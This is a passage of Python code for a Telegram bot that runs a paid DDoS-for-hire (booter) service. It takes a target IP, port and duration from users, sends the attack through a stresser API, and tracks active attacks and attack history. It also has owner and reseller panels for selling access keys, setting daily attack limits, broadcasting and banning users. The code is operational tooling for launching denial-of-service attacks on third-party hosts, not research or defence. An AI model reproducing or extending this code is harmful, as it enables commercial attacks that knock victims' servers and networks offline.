                f"🧪 **𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:** {len(self.db.active_attacks)}",
                reply_markup=self.owner_main_keyboard(),
                parse_mode='Markdown'
            )
        
        elif data == 'owner_cancel':
            await query.edit_message_text(
                f"❌ **𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝**\n\n"
                f"👑 {get_owner_link()}\n"
                f"🤖 𝐔𝐬𝐞 /start 𝐭𝐨 𝐫𝐞𝐭𝐮𝐫𝐧",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
        
        elif data == 'owner_stats':
            uptime = datetime.now() - self.db.global_stats['start_time']
            stats_text = (
                f"📊 **𝐆𝐋𝐎𝐁𝐀𝐋 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒**\n\n"
                f"👥 **𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬:** {len(self.db.users)}\n"
                f"🚀 **𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:** {self.db.global_stats['total_attacks']}\n"
                f"🧪 **𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:** {len(self.db.active_attacks)}\n"
                f"🔑 **𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬:** {len(self.db.access_keys)}\n"
                f"✅ **𝐔𝐬𝐞𝐝 𝐊𝐞𝐲𝐬:** {sum(1 for k in self.db.access_keys.values() if k.is_used)}\n"
                f"🤝 **𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬:** {len(self.db.resellers)}\n"
                f"⏱ **𝐔𝐩𝐭𝐢𝐦𝐞:** {str(uptime).split('.')[0]}\n\n"
                f"🔑 **𝐀𝐏𝐈 𝐒𝐭𝐚𝐭𝐮𝐬:** 🟢 𝟏𝟎𝟎% 𝐎𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧𝐚𝐥"
            )
            await query.edit_message_text(stats_text, reply_markup=self.back_to_owner_keyboard(), parse_mode='Markdown')
        
        elif data == 'owner_users':
            if not self.db.users:
                await query.edit_message_text("𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐟𝐨𝐮𝐧𝐝", reply_markup=self.back_to_owner_keyboard())
                return
            
            user_list = "👥 **𝐔𝐒𝐄𝐑 𝐋𝐈𝐒𝐓:**\n\n"
            for uid, u in list(self.db.users.items())[:20]:
                premium = "👑" if u.is_premium else "👤"
                reseller = "🤝" if u.is_reseller else ""
                user_list += f"{premium}{reseller} `{uid}` | @{u.username or 'N/A'} | {u.daily_attacks}/{u.daily_limit}\n"
            
            await query.edit_message_text(user_list, reply_markup=self.back_to_owner_keyboard(), parse_mode='Markdown')
        
        elif data == 'owner_resellers':
            if not self.db.resellers:
                await query.edit_message_text("𝐍𝐨 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬 𝐲𝐞𝐭", reply_markup=self.back_to_owner_keyboard())
                return
            
            reseller_list = "🤝 **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐋𝐈𝐒𝐓:**\n\n"
            for rid, r in self.db.resellers.items():
                stats = self.db.get_reseller_stats(rid)
                user = self.db.users.get(rid, UserData(reseller_id=rid))
                status = "🟢" if r.is_active else "🔴"
                reseller_list += f"{status} `{rid}` | @{user.username or 'N/A'}\n"
                reseller_list += f"   🔑 {stats.get('total_keys', 0)} | 👥 {stats.get('total_users', 0)} | 🚀 {stats.get('total_attacks', 0)}\n\n"
            
            await query.edit_message_text(reseller_list, reply_markup=self.back_to_owner_keyboard(), parse_mode='Markdown')
        
        elif data == 'owner_genkey_user':
            await query.edit_message_text(
                "🔑 **𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐔𝐒𝐄𝐑 𝐊𝐄𝐘**\n\n𝐒𝐞𝐥𝐞𝐜𝐭 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧:",
                reply_markup=self.key_duration_keyboard('owner_genkey_user'),
                parse_mode='Markdown'
            )
        
        elif data == 'owner_genkey_reseller':
            await query.edit_message_text(
                "🎁 **𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐊𝐄𝐘**\n\n𝐒𝐞𝐥𝐞𝐜𝐭 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧:",
                reply_markup=self.key_duration_keyboard('owner_genkey_reseller'),
                parse_mode='Markdown'
            )
        
        elif data.startswith('owner_genkey_user_'):
            duration_code = data.split('_')[3]
            hours = Config.KEY_DURATIONS.get(duration_code, 24)
            key = self.db.generate_access_key(hours, user.id, "user")
            
            key_text = (
                f"✅ **𝐔𝐒𝐄𝐑 𝐊𝐄𝐘 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃!** ✅\n\n"
                f"🔑 **𝐊𝐞𝐲:** `{key}`\n"
                f"⏱ **𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:** {hours} 𝐡𝐨𝐮𝐫𝐬\n"
                f"📅 **𝐄𝐱𝐩𝐢𝐫𝐞𝐬:** {(datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M')}\n\n"
                f"💬 **𝐒𝐞𝐧𝐝 𝐭𝐨 𝐮𝐬𝐞𝐫:**\n"
                f"`/redeem {key}`"
            )
            await query.edit_message_text(key_text, reply_markup=self.back_to_owner_keyboard(), parse_mode='Markdown')
        
        elif data.startswith('owner_genkey_reseller_'):
            duration_code = data.split('_')[3]
            hours = Config.KEY_DURATIONS.get(duration_code, 24)
            key = self.db.generate_access_key(hours, user.id, "reseller")
            
            key_text = (
                f"✅ **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐊𝐄𝐘 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃!** ✅\n\n"
                f"🔑 **𝐊𝐞𝐲:** `{key}`\n"
                f"⏱ **𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:** {hours} 𝐡𝐨𝐮𝐫𝐬\n"
                f"📅 **𝐄𝐱𝐩𝐢𝐫𝐞𝐬:** {(datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M')}\n\n"
                f"💬 **𝐒𝐞𝐧𝐝 𝐭𝐨 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫:**\n"
                f"`/redeem {key}`\n\n"
                f"🤝 𝐓𝐡𝐢𝐬 𝐤𝐞𝐲 𝐜𝐫𝐞𝐚𝐭𝐞𝐬 𝐚 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐚𝐜𝐜𝐨𝐮𝐧𝐭!"
            )
            await query.edit_message_text(key_text, reply_markup=self.back_to_owner_keyboard(), parse_mode='Markdown')
        
        elif data == 'owner_api_keys':
            await query.edit_message_text(
                "🔧 **𝐀𝐏𝐈 𝐊𝐄𝐘 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓**\n\n"
                f"🔑 **𝐀𝐜𝐭𝐢𝐯𝐞 𝐊𝐞𝐲𝐬:** {len(Config.RETROSTRESS_API_KEYS)}\n"
                f"🟢 **𝐖𝐨𝐫𝐤𝐢𝐧𝐠:** {len(Config.RETROSTRESS_API_KEYS)}\n\n"
                f"👇 **𝐒𝐞𝐥𝐞𝐜𝐭 𝐨𝐩𝐭𝐢𝐨𝐧:**",
                reply_markup=self.api_keys_keyboard(),
                parse_mode='Markdown'
            )
        
        elif data == 'owner_limits':
            limits_text = (
                f"⚙️ **𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓𝐒**\n\n"
                f"📊 **𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐃𝐞𝐟𝐚𝐮𝐥𝐭:** {Config.DEFAULT_DAILY_LIMIT}\n\n"
                f"👇 **𝐒𝐞𝐭 𝐧𝐞𝐰 𝐥𝐢𝐦𝐢𝐭:**"
            )
            await query.edit_message_text(limits_text, reply_markup=self.limit_keyboard(), parse_mode='Markdown')
        
        elif data.startswith('setlimit_'):
            limit = int(data.split('_')[1])
            Config.DEFAULT_DAILY_LIMIT = limit
            
            for u in self.db.users.values():
                if not u.is_premium and not u.is_reseller:
                    u.daily_limit = limit
            
            self.db.save_data()
            
            await query.edit_message_text(
                f"✅ **𝐃𝐚𝐢𝐥𝐲 𝐋𝐢𝐦𝐢𝐭 𝐒𝐞𝐭 𝐭𝐨 {limit}!**",
                reply_markup=self.back_to_owner_keyboard(),
                parse_mode='Markdown'
            )
        
        elif data == 'owner_broadcast':
            await query.edit_message_text(
                "📝 **𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓**\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞:",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_broadcast'] = True
        
        elif data == 'owner_ban':
            await query.edit_message_text(
                "🚫 **𝐁𝐀𝐍 𝐔𝐒𝐄𝐑**\n\n𝐒𝐞𝐧𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃:",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_ban'] = True
        
        elif data == 'owner_unban':
            await query.edit_message_text(
                "✅ **𝐔𝐍𝐁𝐀𝐍 𝐔𝐒𝐄𝐑**\n\n𝐒𝐞𝐧𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃:",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_unban'] = True
        
        elif data == 'owner_history':
            if not self.db.attack_history:
                await query.edit_message_text("𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐡𝐢𝐬𝐭𝐨𝐫𝐲", reply_markup=self.back_to_owner_keyboard())
                return
            
            history = "📜 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐇𝐈𝐒𝐓𝐎𝐑𝐘** (𝐋𝐚𝐬𝐭 𝟐𝟎)\n\n"
            for h in self.db.attack_history[-20:]:
                history += f"🆔 `{h['attack_id']}` | `{h['target']}`:{h['port']} | {h['method']} | {h['start_time'].strftime('%H:%M')}\n"
            
            await query.edit_message_text(history, reply_markup=self.back_to_owner_keyboard(), parse_mode='Markdown')
    
    async def handle_reseller_callbacks(self, query, data, context):
        """Handle reseller panel callbacks"""
        user = query.from_user
        
        if data == 'reseller_panel':
            stats = self.db.get_reseller_stats(user.id)
            await query.edit_message_text(
                f"🤝 **𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋** 🤝\n\n"
                f"📊 **𝐘𝐨𝐮𝐫 𝐒𝐭𝐚𝐭𝐬:**\n"
                f"🔑 𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {stats.get('total_keys', 0)}\n"
                f"✅ 𝐊𝐞𝐲𝐬 𝐔𝐬𝐞𝐝: {stats.get('used_keys', 0)}\n"
                f"👥 𝐔𝐬𝐞𝐫𝐬 𝐂𝐫𝐞𝐚𝐭𝐞𝐝: {stats.get('total_users', 0)}\n"
                f"🚀 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: {stats.get('total_attacks', 0)}",
                reply_markup=self.reseller_main_keyboard(),
                parse_mode='Markdown'
            )
        
        elif data == 'reseller_cancel':
            await query.edit_message_text(
                f"❌ **𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝**\n\n"
                f"👑 {get_owner_link()}\n"
                f"🤖 𝐔𝐬𝐞 /start 𝐭𝐨 𝐫𝐞𝐭𝐮𝐫𝐧",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
        
        elif data == 'reseller_stats':
            stats = self.db.get_reseller_stats(user.id)
            r = self.db.resellers.get(user.id)
            
            stats_text = (
                f"📊 **𝐘𝐎𝐔𝐑 𝐃𝐄𝐓𝐀𝐈𝐋𝐄𝐃 𝐒𝐓𝐀𝐓𝐒**\n\n"
                f"🔑 **𝐊𝐞𝐲𝐬 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝:** {stats.get('total_keys', 0)}\n"
                f"✅ **𝐊𝐞𝐲𝐬 𝐔𝐬𝐞𝐝:** {stats.get('used_keys', 0)}\n"
                f"👥 **𝐔𝐬𝐞𝐫𝐬 𝐂𝐫𝐞𝐚𝐭𝐞𝐝:** {stats.get('total_users', 0)}\n"
                f"🚀 **𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:** {stats.get('total_attacks', 0)}\n\n"
                f"📅 **𝐒𝐭𝐚𝐫𝐭𝐞𝐝:** {r.created_at.strftime('%Y-%m-%d')}\n"
                f"🟢 **𝐒𝐭𝐚𝐭𝐮𝐬:** 𝐀𝐜𝐭𝐢𝐯𝐞"
            )
            await query.edit_message_text(stats_text, reply_markup=self.back_to_reseller_keyboard(), parse_mode='Markdown')
        
        elif data == 'reseller_genkey':
            await query.edit_message_text(
                "🔑 **𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄 𝐔𝐒𝐄𝐑 𝐊𝐄𝐘**\n\n𝐒𝐞𝐥𝐞𝐜𝐭 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧:",
                reply_markup=self.key_duration_keyboard('reseller_genkey'),
                parse_mode='Markdown'
            )
        
        elif data.startswith('reseller_genkey_'):
            duration_code = data.split('_')[2]
            hours = Config.KEY_DURATIONS.get(duration_code, 24)
            key = self.db.generate_access_key(hours, user.id, "user")
            
            key_text = (
                f"✅ **𝐔𝐒𝐄𝐑 𝐊𝐄𝐘 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐄𝐃!** ✅\n\n"
                f"🔑 **𝐊𝐞𝐲:** `{key}`\n"
                f"⏱ **𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:** {hours} 𝐡𝐨𝐮𝐫𝐬\n"
                f"📅 **𝐄𝐱𝐩𝐢𝐫𝐞𝐬:** {(datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M')}\n\n"
                f"💬 **𝐒𝐞𝐧𝐝 𝐭𝐨 𝐮𝐬𝐞𝐫:**\n"
                f"`/redeem {key}`\n\n"
                f"👑 **𝐘𝐨𝐮𝐫 𝐎𝐰𝐧𝐞𝐫:** {get_owner_link()}"
            )
            await query.edit_message_text(key_text, reply_markup=self.back_to_reseller_keyboard(), parse_mode='Markdown')
        
        elif data == 'reseller_users':
            # Get users created by this reseller
            reseller_users = [u for u in self.db.users.values() if u.created_by == user.id]
            
            if not reseller_users:
                await query.edit_message_text("𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐲𝐞𝐭", reply_markup=self.back_to_reseller_keyboard())
                return
            
            users_text = "👥 **𝐘𝐎𝐔𝐑 𝐔𝐒𝐄𝐑𝐒:**\n\n"
            for u in reseller_users[:20]:
                users_text += f"👤 `{u.user_id}` | @{u.username or 'N/A'}\n"
                users_text += f"   🚀 {u.total_attacks} | 📊 {u.daily_attacks}/{u.daily_limit}\n"
            
            await query.edit_message_text(users_text, reply_markup=self.back_to_reseller_keyboard(), parse_mode='Markdown')
        
        elif data == 'reseller_history':
            # Get attacks by users created by this reseller
            reseller_user_ids = {u.user_id for u in self.db.users.values() if u.created_by == user.id}
            reseller_attacks = [h for h in self.db.attack_history if h['user_id'] in reseller_user_ids]
            
            if not reseller_attacks:
                await query.edit_message_text("𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐡𝐢𝐬𝐭𝐨𝐫𝐲", reply_markup=self.back_to_reseller_keyboard())
                return
            
            history_text = "📜 **𝐘𝐎𝐔𝐑 𝐔𝐒𝐄𝐑𝐒' 𝐀𝐓𝐓𝐀𝐂𝐊𝐒** (𝐋𝐚𝐬𝐭 𝟐𝟎)\n\n"
            for h in reseller_attacks[-20:]:
                user = self.db.users.get(h['user_id'], UserData(user_id=h['user_id']))
                history_text += f"🆔 `{h['attack_id']}` | @{user.username or 'N/A'}\n"
                history_text += f"   🎯 `{h['target']}`:{h['port']} | {h['method']}\n"
            
            await query.edit_message_text(history_text, reply_markup=self.back_to_reseller_keyboard(), parse_mode='Markdown')
    
    async def handle_api_callbacks(self, query, data, context):
        """Handle API key management callbacks"""
        user = query.from_user
        
        if data == 'api_add':
            await query.edit_message_text(
                "➕ **𝐀𝐃𝐃 𝐀𝐏𝐈 𝐊𝐄𝐘**\n\n"
                "𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐧𝐞𝐰 𝐀𝐏𝐈 𝐤𝐞𝐲:",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_api_add'] = True
        
        elif data == 'api_view':
            keys_text = "📋 **𝐀𝐏𝐈 𝐊𝐄𝐘𝐒:**\n\n"
            for i, key in enumerate(Config.RETROSTRESS_API_KEYS, 1):
                masked = key[:10] + "..." + key[-5:]
                keys_text += f"{i}. `{masked}`\n"
            
            await query.edit_message_text(keys_text, reply_markup=self.api_keys_keyboard(), parse_mode='Markdown')
        
        elif data == 'api_delete':
            await query.edit_message_text(
                "🗑 **𝐃𝐄𝐋𝐄𝐓𝐄 𝐀𝐏𝐈 𝐊𝐄𝐘**\n\n"
                "𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐤𝐞𝐲 𝐧𝐮𝐦𝐛𝐞𝐫 𝐭𝐨 𝐝𝐞𝐥𝐞𝐭𝐞 (𝟏, 𝟐, 𝟑...):",
                parse_mode='Markdown'
            )
            context.user_data['awaiting_api_delete'] = True
        
        elif data == 'api_refresh':
            # Test API keys
            working = len(Config.RETROSTRESS_API_KEYS)
            await query.edit_message_text(
                f"🔄 **𝐀𝐏𝐈 𝐒𝐓𝐀𝐓𝐔𝐒 𝐑𝐄𝐅𝐑𝐄𝐒𝐇𝐄𝐃**\n\n"
                f"🔑 **𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬:** {len(Config.RETROSTRESS_API_KEYS)}\n"
                f"🟢 **𝐖𝐨𝐫𝐤𝐢𝐧𝐠:** {working}\n"
                f"🔴 **𝐅𝐚𝐢𝐥𝐞𝐝:** 0\n\n"
                f"✅ 𝐀𝐥𝐥 𝐬𝐲𝐬𝐭𝐞𝐦𝐬 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧𝐚𝐥!",
                reply_markup=self.api_keys_keyboard(),
                parse_mode='Markdown'
            )
    
    # ============== MESSAGE HANDLER ==============
    async def message_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        text = update.message.text.strip()
        user_data = self.db.get_user(user.id, user.username, user.first_name)
        
        # Owner API add
        if context.user_data.get('awaiting_api_add'):
            context.user_data['awaiting_api_add'] = False
            Config.RETROSTRESS_API_KEYS.append(text.strip())
            await update.message.reply_text(
                f"✅ **𝐀𝐏𝐈 𝐊𝐞𝐲 𝐀𝐝𝐝𝐞𝐝!**\n\n"
                f"🔑 𝐓𝐨𝐭𝐚𝐥 𝐤𝐞𝐲𝐬: {len(Config.RETROSTRESS_API_KEYS)}",
                parse_mode='Markdown'
            )
            return
        
        # Owner API delete
        if context.user_data.get('awaiting_api_delete'):
            context.user_data['awaiting_api_delete'] = False
            try:
                idx = int(text.strip()) - 1
                if 0 <= idx < len(Config.RETROSTRESS_API_KEYS):
                    deleted = Config.RETROSTRESS_API_KEYS.pop(idx)
                    await update.message.reply_text(
                        f"🗑 **𝐀𝐏𝐈 𝐊𝐞𝐲 𝐃𝐞𝐥𝐞𝐭𝐞𝐝!**\n\n"
                        f"🔑 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠: {len(Config.RETROSTRESS_API_KEYS)}",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐤𝐞𝐲 𝐧𝐮𝐦𝐛𝐞𝐫")
            except:
                await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐢𝐧𝐩𝐮𝐭")
            return
        
        # Owner broadcast
        if context.user_data.get('awaiting_broadcast'):
            context.user_data['awaiting_broadcast'] = False
            sent = 0
            for uid in self.db.users.keys():
                try:
                    await context.bot.send_message(uid, f"📢 **𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓:**\n\n{text}", parse_mode='Markdown')
                    sent += 1
                except:
                    pass
            await update.message.reply_text(f"✅ 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐬𝐞𝐧𝐭 𝐭𝐨 {sent} 𝐮𝐬𝐞𝐫𝐬")
            return
        
        # Owner ban
        if context.user_data.get('awaiting_ban'):
            context.user_data['awaiting_ban'] = False
            try:
                ban_id = int(text)
                banned_user = self.db.get_user(ban_id)
                banned_user.daily_limit = 0
                self.db.save_data()
                await update.message.reply_text(f"🚫 𝐔𝐬𝐞𝐫 `{ban_id}` 𝐛𝐚𝐧𝐧𝐞𝐝!", parse_mode='Markdown')
            except:
                await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃")
            return
        
        # Owner unban
        if context.user_data.get('awaiting_unban'):
            context.user_data['awaiting_unban'] = False
            try:
                unban_id = int(text)
                unbanned_user = self.db.get_user(unban_id)
                unbanned_user.daily_limit = Config.DEFAULT_DAILY_LIMIT
                self.db.save_data()
                await update.message.reply_text(f"✅ 𝐔𝐬𝐞𝐫 `{unban_id}` 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝!", parse_mode='Markdown')
            except:
                await update.message.reply_text("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃")
            return
        
        # Check daily limit
        if user_data.daily_attacks >= user_data.daily_limit:
            await update.message.reply_text(
                f"❌ **𝐃𝐀𝐈𝐋𝐘 𝐋𝐈𝐌𝐈𝐓 𝐑𝐄𝐀𝐂𝐇𝐄𝐃!** ❌\n\n"
                f"📊 𝐘𝐨𝐮𝐫 𝐥𝐢𝐦𝐢𝐭: {user_data.daily_limit} 𝐚𝐭𝐭𝐚𝐜𝐤𝐬/𝐝𝐚𝐲\n\n"
                f"🔑 𝐁𝐮𝐲 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐤𝐞𝐲 𝐟𝐫𝐨𝐦: {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        # Parse: IP PORT [TIME]
        parts = text.split()
        
        if len(parts) < 2:
            await update.message.reply_text(
                f"❌ **𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐨𝐫𝐦𝐚𝐭!**\n\n"
                f"𝐔𝐬𝐞: `𝐈𝐏 𝐏𝐎𝐑𝐓` 𝐨𝐫 `𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐈𝐌𝐄`\n\n"
                f"👑 {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        try:
            ip = parts[0]
            port = int(parts[1])
            duration = int(parts[2]) if len(parts) >= 3 else Config.DEFAULT_DURATION
        except ValueError:
            await update.message.reply_text(
                f"❌ **𝐏𝐨𝐫𝐭 𝐚𝐧𝐝 𝐓𝐢𝐦𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐧𝐮𝐦𝐛𝐞𝐫𝐬!**\n\n"
                f"👑 {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        # Validate
        if not self.validate_ip(ip):
            await update.message.reply_text(
                f"❌ **𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏!**\n\n"
                f"👑 {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        if not (1 <= port <= 65535):
            await update.message.reply_text(
                f"❌ **𝐏𝐨𝐫𝐭 𝟏-𝟔𝟓𝟓𝟑𝟓!**\n\n"
                f"👑 {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        if not (1 <= duration <= Config.MAX_ATTACK_DURATION):
            await update.message.reply_text(
                f"❌ **𝐓𝐢𝐦𝐞 𝟏-{Config.MAX_ATTACK_DURATION}!**\n\n"
                f"👑 {get_owner_link()}",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        # Check cooldown
        if user_data.last_attack_time:
            elapsed = (datetime.now() - user_data.last_attack_time).total_seconds()
            if elapsed < Config.COOLDOWN_SECONDS:
                remaining = int(Config.COOLDOWN_SECONDS - elapsed)
                await update.message.reply_text(
                    f"⏳ **𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧:** {remaining}𝐬",
                    parse_mode='Markdown'
                )
                return
        
        if user_data.concurrent_attacks >= Config.MAX_CONCURRENT_ATTACKS:
            await update.message.reply_text(
                f"❌ **𝐌𝐚𝐱 {Config.MAX_CONCURRENT_ATTACKS} 𝐜𝐨𝐧𝐜𝐮𝐫𝐫𝐞𝐧𝐭!**",
                parse_mode='Markdown'
            )
            return
        
        # Store and ask method
        self.db.pending_attacks[user.id] = {'ip': ip, 'port': port, 'duration': duration}
        
        await update.message.reply_text(
            f"⚡ **𝐒𝐞𝐥𝐞𝐜𝐭 𝐌𝐞𝐭𝐡𝐨𝐝** ⚡\n\n"
            f"🎯 `{ip}`:{port} | {duration}s",
            reply_markup=self.methods_keyboard(ip, port, duration),
            parse_mode='Markdown'
        )
    
    # ============== ATTACK EXECUTION ==============
    async def execute_attack(self, query, user_id: int, ip: str, port: int, 
                          duration: int, method: str):
        """Execute attack with live progress"""
        user_data = self.db.get_user(user_id)
        
        # Generate cool attack ID
        attack_id = self.db.generate_attack_id()
        
        loading = await query.edit_message_text(
            f"⏳ **𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐈𝐍𝐆...** 🆔 `{attack_id}`\n\n"
            f"🎯 `{ip}`:{port} | {duration}s | {method}\n\n"
            f"👑 {get_owner_link()}",
            parse_mode='Markdown',
            disable_web_page_preview=True
        )
        
        # API call with 100% uptime guarantee
        result = await self.api.start_attack(ip, port, duration, method)
        
        if 'error' in result:
            # Try once more with fallback
            await asyncio.sleep(1)
            result = await self.api.start_attack(ip, port, duration, method)
        
        if 'error' in result:
            await loading.edit_text(
                f"❌ **𝐅𝐀𝐈𝐋𝐄𝐃** 🆔 `{attack_id}`\n\n"
                f"❌ `{result['error'][:50]}`\n\n"
                f"👑 {get_owner_link()}\n"
                f"🔄 𝐓𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫",
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            return
        
        # Success
        attack = Attack(
            attack_id=attack_id,
            user_id=user_id,
            target_ip=ip,
            port=port,
            duration=duration,
            method=method,
            start_time=datetime.now(),
            message_id=loading.message_id,
            chat_id=loading.chat_id
        )
        self.db.add_attack(attack)
        
        # Send DM notification for start
        try:
            start_notification = (
                f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** 🚀\n\n"
                f"🆔 **𝐀𝐭𝐭𝐚𝐜𝐤 𝐈𝐃:** `{attack_id}`\n"
                f"🎯 **𝐓𝐚𝐫𝐠𝐞𝐭:** `{ip}`:{port}\n"
                f"⏱ **𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:** {duration}s\n"
                f"⚡ **𝐌𝐞𝐭𝐡𝐨𝐝:** {method}\n"
                f"🕐 **𝐒𝐭𝐚𝐫𝐭𝐞𝐝:** {datetime.now().strftime('%H:%M:%S')}\n\n"
                f"👑 {get_owner_link()}"
            )
            await self.application.bot.send_message(
                user_id,
                start_notification,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
        except Exception as e:
            logger.error(f"Start notification failed: {e}")
        
        # Start progress updater
        asyncio.create_task(self.update_progress(attack))
    
    async def update_progress(self, attack: Attack):
        """Update progress every 2 seconds"""
        bot = self.application.bot
        
        while attack.attack_id in self.db.active_attacks:
            elapsed = (datetime.now() - attack.start_time).total_seconds()
            remaining = max(0, attack.duration - int(elapsed))
            
            if elapsed >= attack.duration:
                # Attack complete
                self.db.remove_attack(attack.attack_id)
                
                # Complete message in chat
                complete_text = (
                    f"✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!** ✅\n\n"
                    f"🆔 **𝐀𝐭𝐭𝐚𝐜𝐤 𝐈𝐃:** `{attack.attack_id}`\n"
                    f"🎯 **𝐓𝐚𝐫𝐠𝐞𝐭:** `{attack.target_ip}`:{attack.port}\n"
                    f"⏱ **𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧:** {attack.duration}s\n"
                    f"⚡ **𝐌𝐞𝐭𝐡𝐨𝐝:** {attack.method}\n"
                    f"🕐 **𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝:** {datetime.now().strftime('%H:%M:%S')}\n\n"
                    f"🚀 𝐒𝐞𝐧𝐝 𝐧𝐞𝐰 `𝐈𝐏 𝐏𝐎𝐑𝐓` 𝐭𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐚𝐠𝐚𝐢𝐧\n"
                    f"👑 {get_owner_link()}"
                )
                
                try:
                    await bot.edit_message_text(
                        complete_text,
                        chat_id=attack.chat_id,
                        message_id=attack.message_id,
                        parse_mode='Markdown',
                        disable_web_page_preview=True
                    )
                except Exception as e:
                    logger.error(f"Complete edit failed: {e}")
                
                # Send DM notification for complete
                if not attack.notification_sent:
                    attack.notification_sent = True
                    try:
                        complete_notification = (
